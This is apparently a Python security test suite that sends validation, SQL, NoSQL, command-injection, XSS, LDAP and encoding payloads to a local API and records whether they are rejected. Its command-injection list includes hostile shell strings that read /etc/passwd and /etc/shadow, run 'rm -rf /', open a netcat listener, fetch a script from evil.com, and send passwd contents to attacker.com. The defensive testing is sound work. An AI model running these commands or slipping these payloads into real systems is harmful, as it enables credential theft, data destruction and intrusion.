#!/usr/bin/env python3
"""
Input Validation Security Testing Suite for Open Accelerator

Tests input validation, sanitization, and protection against various injection
attacks across all API endpoints.

Author: Nik Jois <nikjois@llamasearch.ai>
"""

import argparse
import json
import logging
from typing import Any, Dict

import httpx

logger = logging.getLogger(__name__)


class InputValidationTester:
    """Comprehensive input validation security testing suite."""

    def __init__(self, base_url: str = "http://localhost:8000"):
        """Initialize input validation tester."""
        self.base_url = base_url
        self.valid_token = "Bearer test-token-123"
        self.results = {
            "validation_tests": [],
            "injection_tests": [],
            "overflow_tests": [],
            "format_tests": [],
            "encoding_tests": [],
            "file_upload_tests": [],
            "parameter_pollution_tests": [],
            "summary": {},
        }

    def run_all_tests(self) -> Dict[str, Any]:
        """Run all input validation security tests."""
        logger.info("Starting comprehensive input validation security tests")

        # Test input validation
        self._test_input_validation()

        # Test injection attacks
        self._test_injection_attacks()

        # Test buffer overflow protection
        self._test_buffer_overflow()

        # Test format validation
        self._test_format_validation()

        # Test encoding attacks
        self._test_encoding_attacks()

        # Test file upload validation
        self._test_file_upload_validation()

        # Test parameter pollution
        self._test_parameter_pollution()

        # Generate summary
        self._generate_summary()

        return self.results

    def _test_input_validation(self):
        """Test basic input validation."""
        logger.info("Testing basic input validation")

        # Test simulation endpoint
        self._test_simulation_input_validation()

        # Test agent endpoint
        self._test_agent_input_validation()

        # Test medical endpoint
        self._test_medical_input_validation()

    def _test_simulation_input_validation(self):
        """Test simulation endpoint input validation."""
        test_cases = [
            # Missing required fields
            {"payload": {}, "description": "Empty payload", "should_fail": True},
            # Invalid data types
            {
                "payload": {"accelerator_config": "not_an_object", "workload": 123},
                "description": "Invalid data types",
                "should_fail": True,
            },
            # Negative values
            {
                "payload": {
                    "accelerator_config": {"array_rows": -1, "array_cols": -5},
                    "workload": {"type": "gemm", "matrix_size": -100},
                },
                "description": "Negative values",
                "should_fail": True,
            },
            # Zero values where not allowed
            {
                "payload": {
                    "accelerator_config": {"array_rows": 0, "array_cols": 0},
                    "workload": {"type": "gemm", "matrix_size": 0},
                },
                "description": "Zero values",
                "should_fail": True,
            },
            # Extremely large values
            {
                "payload": {
                    "accelerator_config": {
                        "array_rows": 999999999,
                        "array_cols": 999999999,
                    },
                    "workload": {"type": "gemm", "matrix_size": 999999999},
                },
                "description": "Extremely large values",
                "should_fail": True,
            },
            # Invalid enum values
            {
                "payload": {
                    "accelerator_config": {
                        "array_rows": 4,
                        "array_cols": 4,
                        "data_type": "invalid_type",
                    },
                    "workload": {"type": "invalid_workload_type"},
                },
                "description": "Invalid enum values",
                "should_fail": True,
            },
            # Valid payload (should pass)
            {
                "payload": {
                    "accelerator_config": {
                        "array_rows": 4,
                        "array_cols": 4,
                        "data_type": "float32",
                    },
                    "workload": {"type": "gemm", "matrix_size": 64},
                },
                "description": "Valid payload",
                "should_fail": False,
            },
        ]

        for test_case in test_cases:
            try:
                headers = {"Authorization": self.valid_token}
                url = f"{self.base_url}/api/v1/simulation/run"
                response = httpx.post(url, json=test_case["payload"], headers=headers)

                if test_case["should_fail"]:
                    expected_status = "400-499"
                    passed = 400 <= response.status_code < 500
                else:
                    expected_status = "200-299"
                    passed = 200 <= response.status_code < 300

                test_result = {
                    "test": f"Simulation validation: {test_case['description']}",
                    "expected": expected_status,
                    "actual": response.status_code,
                    "passed": passed,
                    "description": test_case["description"],
                    "payload": test_case["payload"],
                    "details": response.json() if not passed else None,
                }

                self.results["validation_tests"].append(test_result)

            except Exception as e:
                self.results["validation_tests"].append(
                    {
                        "test": f"Simulation validation: {test_case['description']}",
                        "error": str(e),
                        "passed": test_case[
                            "should_fail"
                        ],  # Exception is good for invalid input
                    }
                )

    def _test_agent_input_validation(self):
        """Test agent endpoint input validation."""
        test_cases = [
            # Missing required fields
            {
                "payload": {"agent_type": "optimization"},
                "description": "Missing message field",
                "should_fail": True,
            },
            # Invalid agent type
            {
                "payload": {
                    "agent_type": "invalid_agent_type",
                    "message": "Test message",
                },
                "description": "Invalid agent type",
                "should_fail": True,
            },
            # Empty message
            {
                "payload": {"agent_type": "optimization", "message": ""},
                "description": "Empty message",
                "should_fail": True,
            },
            # Extremely long message
            {
                "payload": {"agent_type": "optimization", "message": "x" * 100000},
                "description": "Extremely long message",
                "should_fail": True,
            },
            # Invalid context type
            {
                "payload": {
                    "agent_type": "optimization",
                    "message": "Test message",
                    "context": "invalid_context",
                },
                "description": "Invalid context type",
                "should_fail": True,
            },
            # Valid payload
            {
                "payload": {
                    "agent_type": "optimization",
                    "message": "Optimize this workload",
                    "context": {"workload": "gemm"},
                },
                "description": "Valid payload",
                "should_fail": False,
            },
        ]

        for test_case in test_cases:
            try:
                headers = {"Authorization": self.valid_token}
                url = f"{self.base_url}/api/v1/agents/chat"
                response = httpx.post(url, json=test_case["payload"], headers=headers)

                if test_case["should_fail"]:
                    expected_status = "400-499"
                    passed = 400 <= response.status_code < 500
                else:
                    expected_status = "200-299"
                    passed = 200 <= response.status_code < 300

                test_result = {
                    "test": f"Agent validation: {test_case['description']}",
                    "expected": expected_status,
                    "actual": response.status_code,
                    "passed": passed,
                    "description": test_case["description"],
                    "payload": test_case["payload"],
                    "details": response.json() if not passed else None,
                }

                self.results["validation_tests"].append(test_result)

            except Exception as e:
                self.results["validation_tests"].append(
                    {
                        "test": f"Agent validation: {test_case['description']}",
                        "error": str(e),
                        "passed": test_case["should_fail"],
                    }
                )

    def _test_medical_input_validation(self):
        """Test medical endpoint input validation."""
        test_cases = [
            # Missing required fields
            {
                "payload": {"workflow_type": "diagnostic"},
                "description": "Missing patient data",
                "should_fail": True,
            },
            # Invalid workflow type
            {
                "payload": {
                    "workflow_type": "invalid_workflow",
                    "patient_data": {"age": 30},
                },
                "description": "Invalid workflow type",
                "should_fail": True,
            },
            # Invalid patient data format
            {
                "payload": {
                    "workflow_type": "diagnostic",
                    "patient_data": "not_an_object",
                },
                "description": "Invalid patient data format",
                "should_fail": True,
            },
            # Invalid age
            {
                "payload": {
                    "workflow_type": "diagnostic",
                    "patient_data": {"age": -5, "gender": "male"},
                },
                "description": "Invalid age (negative)",
                "should_fail": True,
            },
            # Invalid gender
            {
                "payload": {
                    "workflow_type": "diagnostic",
                    "patient_data": {"age": 30, "gender": "invalid_gender"},
                },
                "description": "Invalid gender",
                "should_fail": True,
            },
            # Valid payload
            {
                "payload": {
                    "workflow_type": "diagnostic",
                    "patient_data": {
                        "age": 30,
                        "gender": "male",
                        "weight": 70.5,
                        "height": 175,
                    },
                },
                "description": "Valid payload",
                "should_fail": False,
            },
        ]

        for test_case in test_cases:
            try:
                headers = {"Authorization": self.valid_token}
                url = f"{self.base_url}/api/v1/medical/analyze"
                response = httpx.post(url, json=test_case["payload"], headers=headers)

                if test_case["should_fail"]:
                    expected_status = "400-499"
                    passed = 400 <= response.status_code < 500
                else:
                    expected_status = "200-299"
                    passed = 200 <= response.status_code < 300

                test_result = {
                    "test": f"Medical validation: {test_case['description']}",
                    "expected": expected_status,
                    "actual": response.status_code,
                    "passed": passed,
                    "description": test_case["description"],
                    "payload": test_case["payload"],
                    "details": response.json() if not passed else None,
                }

                self.results["validation_tests"].append(test_result)

            except Exception as e:
                self.results["validation_tests"].append(
                    {
                        "test": f"Medical validation: {test_case['description']}",
                        "error": str(e),
                        "passed": test_case["should_fail"],
                    }
                )

    def _test_injection_attacks(self):
        """Test injection attack prevention."""
        logger.info("Testing injection attack prevention")

        # Test SQL injection
        self._test_sql_injection()

        # Test NoSQL injection
        self._test_nosql_injection()

        # Test command injection
        self._test_command_injection()

        # Test XSS injection
        self._test_xss_injection()

        # Test LDAP injection
        self._test_ldap_injection()

    def _test_sql_injection(self):
        """Test SQL injection prevention."""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 1=1 --",
            "1' OR '1'='1' /*",
            "' OR 'a'='a",
            "1' UNION SELECT null,null,null--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
        ]

        # Test SQL injection in various fields
        test_endpoints = [
            ("/api/v1/simulation/run", "simulation_name"),
            ("/api/v1/agents/chat", "message"),
            ("/api/v1/medical/analyze", "patient_id"),
        ]

        for endpoint, field in test_endpoints:
            for payload in sql_payloads:
                try:
                    headers = {"Authorization": self.valid_token}
                    url = f"{self.base_url}{endpoint}"

                    # Create payload with SQL injection
                    if endpoint == "/api/v1/simulation/run":
                        data = {
                            "simulation_name": payload,
                            "accelerator_config": {"array_rows": 4, "array_cols": 4},
                            "workload": {"type": "gemm", "matrix_size": 64},
                        }
                    elif endpoint == "/api/v1/agents/chat":
                        data = {"agent_type": "optimization", "message": payload}
                    else:  # medical endpoint
                        data = {
                            "workflow_type": "diagnostic",
                            "patient_id": payload,
                            "patient_data": {"age": 30},
                        }

                    response = httpx.post(url, json=data, headers=headers)

                    test_result = {
                        "test": f"SQL injection: {endpoint} - {payload[:20]}...",
                        "expected": "400-499 or sanitized",
                        "actual": response.status_code,
                        "passed": 400 <= response.status_code < 500,
                        "endpoint": endpoint,
                        "field": field,
                        "payload": payload,
                        "details": response.json()
                        if not (400 <= response.status_code < 500)
                        else None,
                    }

                    self.results["injection_tests"].append(test_result)

                except Exception as e:
                    self.results["injection_tests"].append(
                        {
                            "test": f"SQL injection: {endpoint} - {payload[:20]}...",
                            "error": str(e),
                            "passed": True,  # Exception is good for injection attempts
                        }
                    )

    def _test_nosql_injection(self):
        """Test NoSQL injection prevention."""
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "1==1"},
            {"$exists": True},
            {"$in": ["admin", "root"]},
            {"$or": [{"username": "admin"}, {"username": "root"}]},
            {"$and": [{"$gt": 0}, {"$lt": 999999}]},
        ]

        for payload in nosql_payloads:
            try:
                headers = {"Authorization": self.valid_token}
                url = f"{self.base_url}/api/v1/agents/chat"

                data = {
                    "agent_type": "optimization",
                    "message": "Test message",
                    "context": payload,
                }

                response = httpx.post(url, json=data, headers=headers)

                test_result = {
                    "test": f"NoSQL injection: {str(payload)[:30]}...",
                    "expected": "400-499 or sanitized",
                    "actual": response.status_code,
                    "passed": 400 <= response.status_code < 500,
                    "payload": payload,
                    "details": response.json()
                    if not (400 <= response.status_code < 500)
                    else None,
                }

                self.results["injection_tests"].append(test_result)

            except Exception as e:
                self.results["injection_tests"].append(
                    {
                        "test": f"NoSQL injection: {str(payload)[:30]}...",
                        "error": str(e),
                        "passed": True,
                    }
                )

    def _test_command_injection(self):
        """Test command injection prevention."""
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(uname -a)",
            "; cat /etc/shadow",
            "| nc -l 4444",
            "&& wget http://evil.com/malware.sh",
            "; python -c 'import os; os.system(\"whoami\")'",
            "| curl http://attacker.com/steal?data=$(cat /etc/passwd)",
        ]

        for payload in command_payloads:
            try:
                headers = {"Authorization": self.valid_token}
                url = f"{self.base_url}/api/v1/simulation/run"

                data = {
                    "simulation_name": "test",
                    "accelerator_config": {"array_rows": 4, "array_cols": 4},
                    "workload": {"type": "gemm", "matrix_size": 64},
                    "output_path": payload,
                }

                response = httpx.post(url, json=data, headers=headers)

                test_result = {
                    "test": f"Command injection: {payload[:20]}...",
                    "expected": "400-499 or sanitized",
                    "actual": response.status_code,
                    "passed": 400 <= response.status_code < 500,
                    "payload": payload,
                    "details": response.json()
                    if not (400 <= response.status_code < 500)
                    else None,
                }

                self.results["injection_tests"].append(test_result)

            except Exception as e:
                self.results["injection_tests"].append(
                    {
                        "test": f"Command injection: {payload[:20]}...",
                        "error": str(e),
                        "passed": True,
                    }
                )

    def _test_xss_injection(self):
        """Test XSS injection prevention."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
        ]

        for payload in xss_payloads:
            try:
                headers = {"Authorization": self.valid_token}
                url = f"{self.base_url}/api/v1/agents/chat"

                data = {"agent_type": "optimization", "message": payload}

                response = httpx.post(url, json=data, headers=headers)

                test_result = {
                    "test": f"XSS injection: {payload[:30]}...",
                    "expected": "400-499 or sanitized",
                    "actual": response.status_code,
                    "passed": 400 <= response.status_code < 500,
                    "payload": payload,
                    "details": response.json()
                    if not (400 <= response.status_code < 500)
                    else None,
                }

                self.results["injection_tests"].append(test_result)

            except Exception as e:
                self.results["injection_tests"].append(
                    {
                        "test": f"XSS injection: {payload[:30]}...",
                        "error": str(e),
                        "passed": True,
                    }
                )

    def _test_ldap_injection(self):
        """Test LDAP injection prevention."""
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*))|(&(objectclass=*)",
            "admin)(|(userPassword=*))",
            "*))%00",
            "*)(&(objectclass=*)",
            "admin))(|(cn=*",
        ]

        for payload in ldap_payloads:
            try:
                # Test in user authentication context
                headers = {"Authorization": self.valid_token}
                url = f"{self.base_url}/api/v1/medical/analyze"

                data = {
                    "workflow_type": "diagnostic",
                    "patient_data": {"age": 30, "username": payload},
                }

                response = httpx.post(url, json=data, headers=headers)

                test_result = {
                    "test": f"LDAP injection: {payload[:20]}...",
                    "expected": "400-499 or sanitized",
                    "actual": response.status_code,
                    "passed": 400 <= response.status_code < 500,
                    "payload": payload,
                    "details": response.json()
                    if not (400 <= response.status_code < 500)
                    else None,
                }

                self.results["injection_tests"].append(test_result)

            except Exception as e:
                self.results["injection_tests"].append(
                    {
                        "test": f"LDAP injection: {payload[:20]}...",
                        "error": str(e),
                        "passed": True,
                    }
                )

    def _test_buffer_overflow(self):
        """Test buffer overflow protection."""
        logger.info("Testing buffer overflow protection")

        # Test various field sizes
        test_cases = [
            # Small buffer overflow
            {"size": 1000, "description": "Small buffer (1KB)"},
            # Medium buffer overflow
            {"size": 10000, "description": "Medium buffer (10KB)"},
            # Large buffer overflow
            {"size": 100000, "description": "Large buffer (100KB)"},
            # Very large buffer overflow
            {"size": 1000000, "description": "Very large buffer (1MB)"},
            # Extreme buffer overflow
            {"size": 10000000, "description": "Extreme buffer (10MB)"},
        ]

        for test_case in test_cases:
            try:
                # Create large payload
                large_string = "A" * test_case["size"]

                headers = {"Authorization": self.valid_token}
                url = f"{self.base_url}/api/v1/agents/chat"

                data = {"agent_type": "optimization", "message": large_string}

                response = httpx.post(url, json=data, headers=headers)

                test_result = {
                    "test": f"Buffer overflow: {test_case['description']}",
                    "expected": "400-499 or proper handling",
                    "actual": response.status_code,
                    "passed": 400 <= response.status_code < 500,
                    "size": test_case["size"],
                    "description": test_case["description"],
                    "details": response.json()
                    if not (400 <= response.status_code < 500)
                    else None,
                }

                self.results["overflow_tests"].append(test_result)

            except Exception as e:
                self.results["overflow_tests"].append(
                    {
                        "test": f"Buffer overflow: {test_case['description']}",
                        "error": str(e),
                        "passed": True,  # Exception is good for overflow attempts
                    }
                )

    def _test_format_validation(self):
        """Test format validation."""
        logger.info("Testing format validation")

        # Test various format validations
        format_tests = [
            # Email format
            {
                "field": "email",
                "valid_values": ["user@example.com", "test.user+tag@domain.co.uk"],
                "invalid_values": [
                    "invalid-email",
                    "@domain.com",
                    "user@",
                    "user@domain",
                ],
            },
            # URL format
            {
                "field": "url",
                "valid_values": ["https://example.com", "http://test.com/path"],
                "invalid_values": ["not-a-url", "ftp://invalid", "javascript:alert(1)"],
            },
            # UUID format
            {
                "field": "uuid",
                "valid_values": ["123e4567-e89b-12d3-a456-426614174000"],
                "invalid_values": [
                    "not-a-uuid",
                    "123-456-789",
                    "123e4567-e89b-12d3-a456",
                ],
            },
            # IP address format
            {
                "field": "ip_address",
                "valid_values": ["192.168.1.1", "10.0.0.1", "127.0.0.1"],
                "invalid_values": ["256.256.256.256", "192.168.1", "not-an-ip"],
            },
            # Phone number format
            {
                "field": "phone",
                "valid_values": ["+1-555-123-4567", "(555) 123-4567"],
                "invalid_values": ["not-a-phone", "123", "555-ABCD"],
            },
        ]

        for format_test in format_tests:
            # Test valid values
            for valid_value in format_test["valid_values"]:
                try:
                    headers = {"Authorization": self.valid_token}
                    url = f"{self.base_url}/api/v1/medical/analyze"

                    data = {
                        "workflow_type": "diagnostic",
                        "patient_data": {"age": 30, format_test["field"]: valid_value},
                    }

                    response = httpx.post(url, json=data, headers=headers)

                    test_result = {
                        "test": f"Format validation: {format_test['field']} - valid: {valid_value}",
                        "expected": "200-299 or acceptable",
                        "actual": response.status_code,
                        "passed": response.status_code < 400,
                        "field": format_test["field"],
                        "value": valid_value,
                        "valid": True,
                        "details": response.json()
                        if response.status_code >= 400
                        else None,
                    }

                    self.results["format_tests"].append(test_result)

                except Exception as e:
                    self.results["format_tests"].append(
                        {
                            "test": f"Format validation: {format_test['field']} - valid: {valid_value}",
                            "error": str(e),
                            "passed": False,
                        }
                    )

            # Test invalid values
            for invalid_value in format_test["invalid_values"]:
                try:
                    headers = {"Authorization": self.valid_token}
                    url = f"{self.base_url}/api/v1/medical/analyze"

                    data = {
                        "workflow_type": "diagnostic",
                        "patient_data": {
                            "age": 30,
                            format_test["field"]: invalid_value,
                        },
                    }

                    response = httpx.post(url, json=data, headers=headers)

                    test_result = {
                        "test": f"Format validation: {format_test['field']} - invalid: {invalid_value}",
                        "expected": "400-499",
                        "actual": response.status_code,
                        "passed": 400 <= response.status_code < 500,
                        "field": format_test["field"],
                        "value": invalid_value,
                        "valid": False,
                        "details": response.json()
                        if not (400 <= response.status_code < 500)
                        else None,
                    }

                    self.results["format_tests"].append(test_result)

                except Exception as e:
                    self.results["format_tests"].append(
                        {
                            "test": f"Format validation: {format_test['field']} - invalid: {invalid_value}",
                            "error": str(e),
                            "passed": True,  # Exception is good for invalid format
                        }
                    )

    def _test_encoding_attacks(self):
        """Test encoding attack prevention."""
        logger.info("Testing encoding attack prevention")

        # Test various encoding attacks
        encoding_payloads = [
            # URL encoding
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "%27%20OR%20%271%27%3D%271",
            # Double URL encoding
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            # HTML entity encoding
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            # Unicode encoding
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
            # Base64 encoding
            "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            # Hex encoding
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
            # Mixed encoding
            "%3Cscript%3E\\u0061\\u006c\\u0065\\u0072\\u0074('XSS')%3C/script%3E",
        ]

        for payload in encoding_payloads:
            try:
                headers = {"Authorization": self.valid_token}
                url = f"{self.base_url}/api/v1/agents/chat"

                data = {"agent_type": "optimization", "message": payload}

                response = httpx.post(url, json=data, headers=headers)

                test_result = {
                    "test": f"Encoding attack: {payload[:30]}...",
                    "expected": "400-499 or sanitized",
                    "actual": response.status_code,
                    "passed": 400 <= response.status_code < 500,
                    "payload": payload,
                    "details": response.json()
                    if not (400 <= response.status_code < 500)
                    else None,
                }

                self.results["encoding_tests"].append(test_result)

            except Exception as e:
                self.results["encoding_tests"].append(
                    {
                        "test": f"Encoding attack: {payload[:30]}...",
                        "error": str(e),
                        "passed": True,
                    }
                )

    def _test_file_upload_validation(self):
        """Test file upload validation."""
        logger.info("Testing file upload validation")

        # Test various file upload scenarios
        file_tests = [
            # Valid file types
            {
                "filename": "test.txt",
                "content": "Hello world",
                "content_type": "text/plain",
                "should_pass": True,
            },
            # Invalid file extensions
            {
                "filename": "malware.exe",
                "content": "MZ...executable content...",
                "content_type": "application/octet-stream",
                "should_pass": False,
            },
            # Script files
            {
                "filename": "script.js",
                "content": "alert('XSS')",
                "content_type": "application/javascript",
                "should_pass": False,
            },
            # Double extensions
            {
                "filename": "image.jpg.exe",
                "content": "fake image content",
                "content_type": "image/jpeg",
                "should_pass": False,
            },
            # No extension
            {
                "filename": "noextension",
                "content": "content without extension",
                "content_type": "application/octet-stream",
                "should_pass": False,
            },
            # Very long filename
            {
                "filename": "a" * 1000 + ".txt",
                "content": "test content",
                "content_type": "text/plain",
                "should_pass": False,
            },
        ]

        for file_test in file_tests:
            try:
                headers = {"Authorization": self.valid_token}
                url = f"{self.base_url}/api/v1/simulation/upload"

                files = {
                    "file": (
                        file_test["filename"],
                        file_test["content"],
                        file_test["content_type"],
                    )
                }

                response = httpx.post(url, files=files, headers=headers)

                if file_test["should_pass"]:
                    expected_status = "200-299"
                    passed = 200 <= response.status_code < 300
                else:
                    expected_status = "400-499"
                    passed = 400 <= response.status_code < 500

                test_result = {
                    "test": f"File upload: {file_test['filename']}",
                    "expected": expected_status,
                    "actual": response.status_code,
                    "passed": passed,
                    "filename": file_test["filename"],
                    "content_type": file_test["content_type"],
                    "should_pass": file_test["should_pass"],
                    "details": response.json() if not passed else None,
                }

                self.results["file_upload_tests"].append(test_result)

            except Exception as e:
                self.results["file_upload_tests"].append(
                    {
                        "test": f"File upload: {file_test['filename']}",
                        "error": str(e),
                        "passed": not file_test[
                            "should_pass"
                        ],  # Exception is good for invalid uploads
                    }
                )

    def _test_parameter_pollution(self):
        """Test parameter pollution attacks."""
        logger.info("Testing parameter pollution attacks")

        # Test HTTP parameter pollution
        pollution_tests = [
            # Duplicate parameters
            {
                "params": "param1=value1&param1=value2",
                "description": "Duplicate parameters",
            },
            # Array parameters
            {
                "params": "param[]=value1&param[]=value2",
                "description": "Array parameters",
            },
            # Nested parameters
            {
                "params": "param[key1]=value1&param[key2]=value2",
                "description": "Nested parameters",
            },
            # Mixed case parameters
            {
                "params": "Param=value1&param=value2&PARAM=value3",
                "description": "Mixed case parameters",
            },
        ]

        for test_case in pollution_tests:
            try:
                headers = {"Authorization": self.valid_token}
                url = f"{self.base_url}/api/v1/health?{test_case['params']}"

                response = httpx.get(url, headers=headers)

                test_result = {
                    "test": f"Parameter pollution: {test_case['description']}",
                    "expected": "400-499 or proper handling",
                    "actual": response.status_code,
                    "passed": response.status_code < 500,  # Should handle gracefully
                    "params": test_case["params"],
                    "description": test_case["description"],
                    "details": response.json() if response.status_code >= 500 else None,
                }

                self.results["parameter_pollution_tests"].append(test_result)

            except Exception as e:
                self.results["parameter_pollution_tests"].append(
                    {
                        "test": f"Parameter pollution: {test_case['description']}",
                        "error": str(e),
                        "passed": True,  # Exception handling is acceptable
                    }
                )

    def _generate_summary(self):
        """Generate test summary."""
        total_tests = 0
        passed_tests = 0

        for category, tests in self.results.items():
            if category == "summary":
                continue

            category_total = len(tests)
            category_passed = sum(1 for test in tests if test.get("passed", False))

            total_tests += category_total
            passed_tests += category_passed

            self.results["summary"][category] = {
                "total": category_total,
                "passed": category_passed,
                "failed": category_total - category_passed,
                "pass_rate": (category_passed / category_total * 100)
                if category_total > 0
                else 0,
            }

        self.results["summary"]["overall"] = {
            "total": total_tests,
            "passed": passed_tests,
            "failed": total_tests - passed_tests,
            "pass_rate": (passed_tests / total_tests * 100) if total_tests > 0 else 0,
        }

        logger.info(
            f"Input validation security tests completed: {passed_tests}/{total_tests} passed ({self.results['summary']['overall']['pass_rate']:.1f}%)"
        )

    def save_results(self, output_file: str):
        """Save test results to file."""
        with open(output_file, "w") as f:
            json.dump(self.results, f, indent=2)

        logger.info(f"Input validation security test results saved to {output_file}")


def main():
    """Main function for command-line execution."""
    parser = argparse.ArgumentParser(
        description="Input Validation Security Testing Suite"
    )
    parser.add_argument(
        "--target-url", default="http://localhost:8000", help="Target API URL"
    )
    parser.add_argument(
        "--output-file",
        default="input_validation_report.json",
        help="Output file for results",
    )
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")

    args = parser.parse_args()

    if args.verbose:
        logging.basicConfig(level=logging.INFO)

    # Run input validation security tests
    tester = InputValidationTester(args.target_url)
    results = tester.run_all_tests()

    # Save results
    tester.save_results(args.output_file)

    # Print summary
    summary = results["summary"]["overall"]
    print("\nInput Validation Security Test Summary:")
    print(f"Total tests: {summary['total']}")
    print(f"Passed: {summary['passed']}")
    print(f"Failed: {summary['failed']}")
    print(f"Pass rate: {summary['pass_rate']:.1f}%")

    # Exit with appropriate code
    return 0 if summary["pass_rate"] >= 80 else 1


if __name__ == "__main__":
    exit(main())
